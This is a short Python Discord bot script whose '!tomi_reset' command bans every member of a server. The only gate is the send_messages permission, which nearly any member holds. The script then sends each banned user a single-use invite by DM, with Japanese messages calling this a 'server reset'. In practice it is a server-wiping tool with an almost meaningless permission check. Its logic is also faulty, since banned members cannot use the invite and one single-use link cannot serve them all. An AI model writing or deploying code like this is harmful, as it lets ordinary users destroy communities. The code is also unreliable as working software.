import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='tomi_reset')
async def tomi_reset(ctx):
    # Check if the author has the 'send_messages' permission
    if ctx.author.guild_permissions.send_messages:
        # Get all members in the server
        members = ctx.guild.members

        # Ban all members in the server
        for member in members:
            await ctx.guild.ban(member, reason="サーバーリセットの実施")

        # Create an invite link for the server
        invite = await ctx.channel.create_invite(max_uses=1)

        # Send the invite link to each member via DM
        for member in members:
            try:
                await member.send(f"サーバーがリセットされました。新しい招待リンク: {invite.url}")
            except discord.Forbidden:
                pass  # Skip if the member cannot receive DMs
    else:
        await ctx.send("このコマンドを実行する権限がありません。")

bot.run('YOUR_BOT_TOKEN')
